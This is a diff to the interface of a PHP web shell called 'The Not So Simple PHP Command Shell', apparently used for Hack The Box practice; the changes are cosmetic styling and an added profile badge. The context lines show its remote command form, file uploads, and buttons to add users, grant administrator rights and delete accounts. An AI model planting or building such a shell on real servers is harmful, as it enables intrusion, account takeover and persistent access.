@@ -24,14 +24,7 @@ $attackport = "8000";
 			-webkit-text-size-adjust: 100%;
 			-ms-text-size-adjust: 100%;
 			-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
-			overflow-y: scroll;
-			background: -moz-linear-gradient(top, #070640 0%, #070640 29%, #060430 100%);
-			background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#070640), color-stop(29%,#070640), color-stop(100%,#060430));
-			background: -webkit-linear-gradient(top, #070640 0%,#070640 29%,#060430 100%);
-			background: -o-linear-gradient(top, #070640 0%,#070640 29%,#060430 100%);
-			background: -ms-linear-gradient(top, #070640 0%,#070640 29%,#060430 100%);
-			background: linear-gradient(to bottom, #070640 0%,#070640 29%,#060430 100%);
-			background: #000f42;
+			background: #190565;
 			border:1px solid #333;
 			width:55%;
 			padding:20px 30px;
@@ -76,7 +69,7 @@ $attackport = "8000";
         echo '
         <div class="main_body">
 		<h4 style="text-align:center;">The Not So Simple PHP Command Shell</h4><br>
-        <div style="display:inline;margin:10px;"><form style="float:left" action="" method="get">Command:&nbsp;&nbsp;<input type="text" name="cmd" autofocus placeholder="Type a command" /><button type="submit" class="btn btn-primary"><i class="fa fa-gear"></i> Execute</button></form><form style="float:right" action="nsscmdshell.php" method="GET"> <a href="?links=1" role="button" class="btn btn-primary"><i class="fa fa-external-link"></i> QuickLinks </a>&nbsp;<button name="phpInfo" class="btn btn-primary"><i class="fa fa-file-code-o"></i> PHPInfo </button>&nbsp;<button name="check" id="action-button" title="show var_dump for $_SESSION[\'actions\']" class="btn btn-primary"><i class="fa fa-history"></i> Show History </button> <button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell." class="btn btn-danger"><i class="fa fa-trash"></i> Cleanup Files </button></form></div>
+        <div style="display:inline;margin:10px;"><form style="float:left" action="" method="get">Command<br><input type="text" name="cmd" autofocus placeholder="Type a command" /><button type="submit" class="btn btn-primary"><i class="fa fa-gear"></i> Execute</button></form><form style="float:right" action="nsscmdshell.php" method="GET"> <a href="?links=1" role="button" class="btn btn-primary"><i class="fa fa-external-link"></i> QuickLinks </a>&nbsp;<button name="phpInfo" class="btn btn-primary"><i class="fa fa-file-code-o"></i> PHPInfo </button>&nbsp;<button name="check" id="action-button" title="show var_dump for $_SESSION[\'actions\']" class="btn btn-primary"><i class="fa fa-history"></i> Show History </button> <button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell." class="btn btn-danger"><i class="fa fa-trash"></i> Cleanup Files </button></form></div>
 <p>&nbsp;</p>
         File Options<br>
         <form action="" method="get">
@@ -109,7 +102,7 @@ $attackport = "8000";
         <input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
         <br><br>
         <button type="submit" name="addUser" title="adds the specified user to the system with the password provided." class="btn btn-primary"><i class="fa fa-user-plus"></i> Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user." class="btn btn-primary"><i class="fa fa-user-secret"></i> Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user." class="btn btn-primary"><i class="fa fa-user"></i> Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user." class="btn btn-danger"><i class="fa fa-user-times"></i> DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;
-        </form><br><form><a role="button" href="?update=true" title="Check for and Download newer version of NSSCMDSHELL.php" class="btn btn-success"><i class="fa fa-retweet"></i> Update</a> <input type="hidden" name="clear" value="true" /><button onClick="window.location.reload();" class="btn btn-danger"><i class="fa fa-refresh"></i> Clear Console</button></form>
+        </form><br><form><a role="button" href="?update=true" title="Check for and Download newer version of NSSCMDSHELL.php" class="btn btn-success"><i class="fa fa-retweet"></i> Update</a> <input type="hidden" name="clear" value="true" /><button onClick="window.location.reload();" class="btn btn-danger"><i class="fa fa-refresh"></i> Clear Console</button><div style="float:right;"><a href="https://app.hackthebox.com/profile/476578" target="_blank" title="KaotickJ on Hack the Box"><img src="http://www.hackthebox.eu/badge/image/476578" /></a></div></form>
 
         </div>';
 
